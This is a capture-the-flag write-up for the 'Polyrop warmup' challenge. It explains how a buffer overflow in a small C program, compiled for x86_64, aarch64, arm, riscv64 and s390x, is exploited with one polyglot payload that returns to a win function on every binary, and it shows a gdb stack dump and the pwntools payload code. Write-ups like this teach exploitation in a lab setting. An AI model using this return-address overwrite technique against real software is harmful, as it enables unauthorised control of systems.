# Polyrop warmup

- Category: rev
- Final point value: 274
- Number of solves: 13
- Solved by: `mouthon`

This challenge was about [Multi-Variant Execution](https://dl.acm.org/doi/abs/10.1145/3447852.3458714). There was a simple [C file](./composer.c), with an obvious unlimited buffer overflow in `add_composer`, which could be used to leak any address and hijack control flow. A `win` function prints out a token read from file descriptor 42.

The particulariy of this challenge is that this c file had been compiled for 5 different architectures: x86_64, aarch64, arm, riscv64 and s390x. I had never heard about s390x before, I have no idea where it comes from, and in my opinion all its opcode names looks like onomatopeia you would produce if you were being strangled. Anyway, a [python script](./composer.py) was responsible for dispatching your inputs to the five binaries, and to win you would need all five tokens, obtained by calling the `win` function on each binary. So, we would need a payload that triggers `win` for all the binaries.

I first tried to exploit each binary independently from each other, using `gdb-multiarch` and [gef](https://github.com/bata24/gef). It turned out you did not need to know how each of these architecture works: you just needed to feed some input, then use `tele` to get the content of the stack, where you could see your buffer, identify potential functions you could use for leaking the PIE, and the offset of the return address of `main`:
```
  $sp  0x7f3194f9e4c0|+0x0000|+000: 0x00007f3194f9e50f  ->  0x0000000000000a00  <-  $s1
       0x7f3194f9e4c8|+0x0008|+001: 0x0000000000000000
       0x7f3194f9e4d0|+0x0010|+002: 0x000055555555e370 <buf+0x8>  ->  0x4141414141414141 'AAAAAAAAAAAAAAAA\n'  <-  $a1, $a3
       0x7f3194f9e4d8|+0x0018|+003: 0x0000000000000400
       0x7f3194f9e4e0|+0x0020|+004: 0x000055555555e108 <__stdout_FILE>  ->  0x0000000000000045
       0x7f3194f9e4e8|+0x0028|+005: 0x00007f3194f9e538  ->  0x0000000000000000
       0x7f3194f9e4f0|+0x0030|+006: 0x000055555555e018 <__stdin_FILE>  ->  0x0000000000000009  <-  $fp
       0x7f3194f9e4f8|+0x0038|+007: 0x0000555555559526 <__uflow+0x1a>  ->  0x450300f518634785  <-  retaddr[1], $ra
       0x7f3194f9e500|+0x0040|+008: 0x000055555555e108 <__stdout_FILE>  ->  0x0000000000000045
       0x7f3194f9e508|+0x0048|+009: 0x00007f3194f9e538  ->  0x0000000000000000
       0x7f3194f9e510|+0x0050|+010: 0x000000000000000a
       0x7f3194f9e518|+0x0058|+011: 0x00005555555569f0 <main+0xc2>  ->  0x4505fb9514e38b2a  <-  retaddr[2]
       0x7f3194f9e520|+0x0060|+012: 0x0000000000000000
       0x7f3194f9e528|+0x0068|+013: 0x4141414141414141 'AAAAAAAAAAAAAAAA'
       0x7f3194f9e530|+0x0070|+014: 0x4141414141414141 'AAAAAAAA'
       0x7f3194f9e538|+0x0078|+015: 0x0000000000000000
       0x7f3194f9e540|+0x0080|+016: 0x0000000000000000
       0x7f3194f9e548|+0x0088|+017: 0x0000000000000000
       0x7f3194f9e550|+0x0090|+018: 0x0000000000000000
       0x7f3194f9e558|+0x0098|+019: 0x0000000000000000
       0x7f3194f9e560|+0x00a0|+020: 0x0000000000000000
       0x7f3194f9e568|+0x00a8|+021: 0x0000000000000000
       0x7f3194f9e570|+0x00b0|+022: 0x0000000000000000
       0x7f3194f9e578|+0x00b8|+023: 0x000055555555692e <main>  ->  0xf4a6f8a2fc867119
       0x7f3194f9e580|+0x00c0|+024: 0x00007f3194f9e5d8  ->  0x00007f3194f9ea1e  ->  0x7265736f706d6f63 'composer-riscv64'
       0x7f3194f9e588|+0x00c8|+025: 0x0000000000000001
       0x7f3194f9e590|+0x00d0|+026: 0x00007f3194f9e5e8  ->  0x00007f3194f9ea2f  ->  0x622f3d4c4c454853 'SHELL=/bin/zsh'
       0x7f3194f9e598|+0x00d8|+027: 0x0000555555556bce <libc_start_main_stage2+0x26>  ->  0xe8221101a9bff0ef
       0x7f3194f9e5a0|+0x00e0|+028: 0x00007f3194f9e5d8  ->  0x00007f3194f9ea1e  ->  0x7265736f706d6f63 'composer-riscv64'
```

It turned out that ASLR really existed only with aarch64, but we leaked it with all the architectures just in case. We then only had to make a payload where the address of `win` was at the right offset for every architecture (and there were hopefully no overlap), and pay attention to the fact that ARM's adresses are only 4 bytes long, x86_64 must keep a 0x10 aligned stack, and s390x is big-endian. The final payload looks like this:
```python
    payload = b""
    payload += 0x28*b"A"
    payload += p64(vulns[AARCH64].symbols["win"]) #0x30
    payload += 8*b"F"
    payload += 4*b"E" + p32(vulns[ARM].symbols["win"])
    payload += 0x18*b"D" #0x58
    payload += p64(vulns[X86_64].address + X86_64_RET)
    payload += p64(vulns[X86_64].symbols["win"])
    payload += 8*b"B" #0x70
    payload += p64(vulns[RISCV64].symbols["win"])
    payload += 0x18*b"C"
    payload += p64(vulns[S390X].symbols["win"], endian="big")
```

The full exploit can be found [here](./exploit.py)